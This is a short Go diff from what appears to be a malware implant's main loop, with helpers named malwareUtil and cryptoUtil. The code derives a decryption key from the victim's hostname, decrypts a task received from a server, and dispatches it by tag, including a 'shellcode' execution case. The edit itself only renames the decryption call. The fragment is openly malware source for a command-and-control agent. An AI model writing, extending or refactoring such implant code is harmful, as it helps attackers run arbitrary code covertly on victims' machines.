@@ -59,7 +59,7 @@ func Init() {
 			malwareUtil.Sleep(sleepTime)
 		} else {
 			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
-			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
+			hexSc, _ := cryptoUtil.Decrypt(body, []byte(key))
 			task, _ := malwareUtil.UnmarshalJSON(hexSc)
 			switch task.Tag {
 			case "shellcode":
